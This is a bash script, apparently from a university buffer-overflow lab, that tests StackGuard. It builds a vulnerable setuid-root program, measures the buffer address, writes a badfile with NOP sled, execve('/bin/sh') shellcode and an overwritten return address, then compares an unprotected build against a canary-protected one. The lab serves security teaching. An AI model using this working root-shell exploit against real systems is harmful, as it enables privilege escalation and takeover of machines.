#!/bin/bash
# T4.2 - StackGuard. Sonde reelle + chown/chmod (oublie dans la version
# precedente du script, c'etait le vrai bug ce soir, pas l'adressage).
source "$(dirname "$0")/00_config.sh" || exit 1
sudo ln -sf /bin/zsh /bin/sh
mkdir -p "$E4/stackguard" && cd "$E4/stackguard" || exit 1
cp "$E3/stack.c" .

echo "=== Mesure reelle de &buffer (sonde temporaire) ==="
cp stack.c stack_probe_tmp.c
sed -i '/char buffer\[BUF_SIZE\];/a\    printf("PROBE &buffer = %p\\n", (void*)buffer); fflush(stdout);' stack_probe_tmp.c
gcc -DBUF_SIZE=100 -m32 -z execstack -fno-stack-protector -o stack_base stack_probe_tmp.c
touch badfile
PROBE_OUT=$(timeout 2 ./stack_base 2>&1)
BUF_HEX=$(echo "$PROBE_OUT" | grep -oE '0x[0-9a-fA-F]+' | tail -1)
rm -f stack_probe_tmp.c
RET_HEX=$(python3 -c "print(hex($BUF_HEX + 300))")
echo "&buffer=$BUF_HEX  ret=$RET_HEX"

echo "=== Reconstruction PROPRE + setuid root (base ET canary) ==="
gcc -DBUF_SIZE=100 -m32 -o stack_base   -z execstack -fno-stack-protector   stack.c
gcc -DBUF_SIZE=100 -m32 -o stack_canary -z execstack -fstack-protector-all stack.c
sudo chown root stack_base stack_canary
sudo chmod 4755 stack_base stack_canary

echo "=== Generation du badfile (offset=112, start=400) ==="
python3 - <<PYEOF
shellcode = (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')
content = bytearray(0x90 for i in range(517))
start = 400
content[start:start + len(shellcode)] = shellcode
ret    = $RET_HEX
offset = 112
content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')
with open('badfile', 'wb') as f:
    f.write(content)
PYEOF

echo "--- stack_base (controle, attendu euid=0) ---"
./stack_base
id

echo "--- stack_canary (attendu: stack smashing detected) ---"
./stack_canary
